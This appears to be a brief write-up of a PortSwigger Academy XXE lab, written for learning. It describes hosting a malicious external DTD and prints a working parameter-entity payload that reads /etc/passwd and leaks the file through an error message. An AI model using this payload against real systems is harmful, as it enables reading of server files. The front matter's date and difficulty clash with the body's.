---
vulnerability: XXE
platform: PortSwigger
difficulty: Medium
date: 2025-11-07
---
**Date:** 2024-11-07  
**Platform:** PortSwigger Academy  
**Difficulty:** Practitioner  
**Vulnerability:** XML External Entity (XXE)

## Key Steps
1. Hosted a malicious DTD on the exploit server.
2. The DTD used parameter entities to read `/etc/passwd` and trigger an error containing the file content.
3. Injected a document type definition in the request that fetched and executed the remote DTD.

## Payload
Malicious DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;

## Lesson Learned
Complex exfiltration is possible using external DTDs and parameter entities, which can read local files and reflect the data in error messages.